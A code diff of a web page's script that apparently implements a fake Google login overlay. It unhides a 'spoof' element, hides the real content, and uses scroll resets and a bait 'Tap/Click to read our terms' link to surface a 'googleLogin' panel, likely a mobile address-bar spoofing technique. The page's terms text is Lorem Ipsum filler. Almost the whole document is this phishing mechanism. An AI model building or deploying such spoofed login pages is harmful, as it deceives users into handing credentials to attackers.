@@ -18,31 +18,26 @@
         
         var details = document.querySelector("details");
         var content = document.getElementById("content");
-        var shouldShowLogin = false;
+        var shouldResetScrollOnce = false;
                function googleTap(){
                 document.getElementById("spoof").style = "display: block;";
                 document.getElementById("content").style = "display: none;";
                 window.scrollTo(0, 5);
                }
-               
-               
-               function firstTap(){
-                     content.click();
-                     window.scrollTo(0, 700); 
-                     window.scrollTo(0, 0); 
-                     shouldShowLogin = true;
-               }
+              
                
                
                   window.onscroll = function (e)
                {
+                   if(!shouldResetScrollOnce){
+                   window.scrollTo(0, 0);
+                   }
+                   
                document.getElementById("googleLogin").style = "width:50%;display:block;";
+               shouldResetScrollOnce = true;
                 }
              
-             details.addEventListener("toggle", function() {
-             content.click();
-             content.click();
-            });
+            
 
         </script>
     </head>  
@@ -59,7 +54,7 @@
          <div id="terms">
              <details>
                    <summary style="color:blue;">
-                       <center><u>Tap here to read our terms</u></center>
+                       <center><u>Click to read our terms</u></center>
                    </summary>
               <p>
                Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit amet..", comes from a line in section 1.10.32.
